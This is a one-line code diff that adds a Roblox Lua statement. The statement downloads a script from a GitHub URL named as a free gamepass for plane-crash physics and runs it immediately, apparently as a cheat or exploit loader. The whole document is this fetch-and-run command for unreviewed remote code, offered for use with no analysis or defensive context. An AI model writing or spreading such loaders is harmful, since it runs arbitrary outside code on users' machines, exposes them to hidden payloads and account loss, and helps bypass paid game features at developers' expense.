@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/echofluff/scripts/main/free-plane-crash-physics-gamepass",true))()
